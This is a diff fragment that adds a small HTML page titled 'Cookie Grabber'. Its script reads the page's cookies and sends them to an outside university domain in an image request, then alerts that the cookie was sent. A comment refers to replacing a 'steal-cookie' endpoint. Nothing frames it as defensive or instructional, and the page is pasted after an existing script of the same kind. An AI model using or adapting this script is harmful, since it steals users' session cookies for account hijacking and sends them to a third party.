@@ -14,3 +14,33 @@ function grabCookie() {
     document.body.appendChild(img);
 }
 </script>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cookie Grabber</title>
+<script>
+function grabCookie() {
+    // Retrieve cookie value
+    var cookieValue = document.cookie;
+    
+    // Send cookie value to the other website
+    // Replace 'https://example.com/steal-cookie' with the endpoint on the other website
+    var img = new Image();
+    img.src = 'https://globalcareers.monash.edu?cookie=' + encodeURIComponent(cookieValue);
+    document.body.appendChild(img);
+    
+    // Display a message
+    alert("Cookie value sent to another website!");
+}
+</script>
+</head>
+<body>
+
+<button onclick="grabCookie()">Click to Grab Cookie</button>
+
+</body>
+</html>
+
